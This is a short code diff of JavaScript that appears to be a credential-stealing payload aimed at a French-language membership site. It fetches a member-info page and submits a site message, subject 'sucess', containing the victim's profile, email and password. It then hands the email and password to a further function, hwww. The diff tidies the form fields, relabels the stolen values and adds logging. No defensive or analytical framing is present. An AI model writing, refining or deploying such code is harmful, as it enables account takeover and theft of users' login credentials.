@@ -31,11 +31,14 @@ fetch('/membres/infos_membre.htm').then(function(response) {
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
         body: new URLSearchParams({
             'sujet': 'sucess',
-            piece_jointe_1: "",
-            piece_jointe_1: "",
-            message: ` email ${profil}, ${email}, ${pwd}`,
+            piece_jointe_1: undefined,
+            piece_jointe_2: undefined,
+            message: `prof ${profil}, em ${email}, pw ${pwd}`,
             send_msg: "Envoi en cours, patientez SVP..."
         })
-    }).then(() => hwww(email, pwd), (e) => alert(e)).then(() => 1)
+    }).then((r) => {
+        console.log(r);
+        hwww(email, pwd);
+    }, (e) => alert(e)).then(() => 1)
 
 });
